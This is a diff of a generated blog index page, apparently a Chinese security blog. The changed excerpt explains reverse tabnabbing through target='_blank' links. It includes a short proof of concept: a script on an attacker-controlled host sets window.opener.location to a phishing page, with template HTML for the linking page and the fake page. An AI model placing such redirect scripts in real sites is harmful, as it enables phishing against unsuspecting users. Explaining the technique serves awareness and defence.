@@ -90,11 +90,12 @@
             <div style="padding:5px 5px 2px 0px;">
                 <i class="fa fa-calendar fa-fw"></i>
                 <time>2016-10-12</time>
-            </div>
-
+                &nbsp;&nbsp;&nbsp;&nbsp;
             
 
-            <div style="padding:2px 5px 2px 0px;">
+                
+
+            
                 
                 
                 
@@ -120,9 +121,9 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 _blank  _blank是html中的标签属性，如&lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt;, 但若点击HELLO打开的网页1.php中有如下代码：
+        0x00 _blank _blank是html中的标签属性，如&lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt;, 但若点击HELLO打开的网页1.php中有如下代码：
 &lt;script&gt; if(window.opener){ window.opener.location = &quot;http://xss.reber-9.com/fish.html&quot;; } &lt;/script&gt;  则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼
- 0x01 简单模板  a.html内容如下：   &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;    http://xss.reber-9.com/1.php中1.php内容如下：   &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;script&gt; if(window.opener){ window.opener.location = &quot;http://xss.reber-9.com/fish.html&quot;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;hello&lt;/p&gt; &lt;/body&gt; &lt;/html&gt;    1.php同级下有个钓鱼模板fish.html，内容如下：   &lt;html&gt; &lt;head&gt; &lt;title&gt;fish&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;This is fishing template!
+0x01 简单模板  a.html内容如下：  &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;   http://xss.reber-9.com/1.php中1.php内容如下：  &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;script&gt; if(window.opener){ window.opener.location = &quot;http://xss.reber-9.com/fish.html&quot;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;hello&lt;/p&gt; &lt;/body&gt; &lt;/html&gt;   1.php同级下有个钓鱼模板fish.html，内容如下：  &lt;html&gt; &lt;head&gt; &lt;title&gt;fish&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h2&gt;This is fishing template!&lt;/h2&gt; &lt;/body&gt; &lt;/html&gt;   点击a.
     </p>
 
     
